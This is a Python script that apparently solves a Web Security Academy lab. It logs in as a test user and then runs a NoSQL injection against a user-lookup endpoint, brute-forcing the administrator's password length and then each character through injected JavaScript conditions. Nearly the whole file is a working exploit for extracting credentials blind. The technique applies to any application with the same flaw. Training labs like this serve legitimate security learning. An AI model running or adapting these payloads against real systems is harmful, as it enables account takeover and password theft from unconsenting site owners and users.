import requests
import string
import sys
import re

TARGET_URL = "https://0a0000ae048f92148083856a00ec0057.web-security-academy.net"
TARGET_URL = TARGET_URL.rstrip('/')
LOGIN_URL = f"{TARGET_URL}/login"
LOOKUP_URL = f"{TARGET_URL}/user/lookup"
CHARSET = string.ascii_lowercase + string.digits

def solve_lab():
    session = requests.Session()
    
    print("[1] Logging in...")
    try:
        r_login_page = session.get(LOGIN_URL)
        csrf_token = re.search(r'name="csrf" value="(.*?)"', r_login_page.text).group(1)
        
        login_data = {
            "csrf": csrf_token,
            "username": "wiener",
            "password": "peter"
        }
        
        r_post = session.post(LOGIN_URL, data=login_data)
        
        if "Log out" not in r_post.text:
            print("Login failed. Could not find 'Log out' text.")
            return
        print("Login successful.")
        
    except Exception as e:
        print(e)
        return

    print("[2] Identifying password length...")
    password_length = 0
    
    for length in range(1, 50):
        payload = f"administrator' && this.password.length == {length} || 'a'=='b"
        r = session.get(LOOKUP_URL, params={'user': payload})
        
        if "administrator" in r.text:
            password_length = length
            print(f"Length found: {password_length}")
            break
            
    if password_length == 0:
        print("Failed to find password length.")
        return

    print(f"[3] Brute-forcing password ({password_length} chars)...")
    password = ""
    
    for i in range(password_length):
        found_char = False
        for char in CHARSET:
            payload = f"administrator' && this.password[{i}]=='{char}' || 'a'=='b"
            r = session.get(LOOKUP_URL, params={'user': payload})
            
            if "administrator" in r.text:
                password += char
                found_char = True
                sys.stdout.write(f"\rFound: {password}")
                sys.stdout.flush()
                break
        
        if not found_char:
            break
            
    print(f"\nFinal Password: {password}")

if __name__ == "__main__":
    solve_lab()